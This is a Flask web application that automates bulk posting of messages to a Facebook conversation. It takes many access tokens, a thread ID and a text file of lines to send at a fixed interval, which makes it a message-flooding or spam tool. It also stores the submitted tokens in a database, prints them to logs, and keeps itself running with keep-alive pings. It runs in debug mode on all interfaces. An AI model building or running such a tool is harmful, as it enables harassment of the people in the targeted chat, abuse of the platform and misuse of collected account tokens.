from flask import Flask, request, jsonify, render_template
import requests
import os
import time
from time import sleep
import threading
from datetime import datetime
import atexit
from apscheduler.schedulers.background import BackgroundScheduler
from database import init_db, add_user, update_user_status, get_all_users, cleanup_inactive_users

app = Flask(__name__)
app.config['KEEP_ALIVE_URL'] = os.getenv('KEEP_ALIVE_URL', 'https://your-app-url.onrender.com')

def keep_alive():
    """Send request to keep the server alive"""
    try:
        requests.get(app.config['KEEP_ALIVE_URL'])
        print("Keep-alive ping sent successfully")
    except Exception as e:
        print(f"Keep-alive ping failed: {str(e)}")
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

# Initialize database
init_db()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        tokens = request.form.getlist('accessToken[]')
        thread_id = request.form['threadId']
        kidx = request.form['kidx']
        time_interval = int(request.form['time'])
        
        if 'txtFile' not in request.files:
            return 'No file uploaded'
        
        file = request.files['txtFile']
        if file.filename == '':
            return 'No file selected'
            
        if file:
            messages = file.read().decode('utf-8').splitlines()
            
            for token in tokens:
                # Add user to database
                add_user(token)
                
                thread = threading.Thread(target=send_messages, args=(token, thread_id, kidx, messages, time_interval))
                thread.daemon = True
                thread.start()
                
            return 'Messages are being sent using multiple tokens!'
    
    # Get current active users
    current_users = get_all_users()
    return render_template('index.html', active_users=current_users)

def send_messages(token, thread_id, kidx, messages, time_interval):
    try:
        total_messages = len(messages)
        sent_messages = 0
        
        for message1 in messages:
            api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
            message = str(kidx) + ' ' + message1
            parameters = {'access_token': token, 'message': message}
            
            try:
                response = requests.post(api_url, data=parameters, headers=headers)
                if response.status_code == 200:
                    sent_messages += 1
                    update_user_status(token, 'active', sent_messages)
                    print(f"Message sent using token {token}: {message}")
                else:
                    print(f"Failed to send message using token {token}: {message}")
                    update_user_status(token, 'error', sent_messages)
                
                time.sleep(time_interval)
                
            except Exception as e:
                print(f"Error sending message: {str(e)}")
                update_user_status(token, 'error', sent_messages)
                time.sleep(30)
                
    except Exception as e:
        print(f"Error in send_messages: {str(e)}")
        update_user_status(token, 'error')
    finally:
        update_user_status(token, 'completed', sent_messages)

# Start cleanup thread
def cleanup_thread():
    while True:
        cleanup_inactive_users()
        time.sleep(3600)  # Run every hour

cleanup_thread = threading.Thread(target=cleanup_thread)
cleanup_thread.daemon = True
cleanup_thread.start()

# Status endpoint for uptime monitoring
@app.route('/status', methods=['GET'])
def status():
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'active_users': len(get_all_users())
    }), 200

# Initialize scheduler
scheduler = BackgroundScheduler()
scheduler.add_job(func=keep_alive, trigger="interval", minutes=5)
scheduler.add_job(func=cleanup_inactive_users, trigger="interval", hours=1)
scheduler.start()

# Shut down the scheduler when exiting the app
atexit.register(lambda: scheduler.shutdown())

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    # Set Keep-Alive URL based on port
    if port != 5000:  # Production
        app.config['KEEP_ALIVE_URL'] = f"https://{os.environ.get('RENDER_EXTERNAL_URL', '')}/status"
    else:  # Development
        app.config['KEEP_ALIVE_URL'] = f"http://localhost:{port}/status"
    
    app.run(debug=True, host='0.0.0.0', port=port)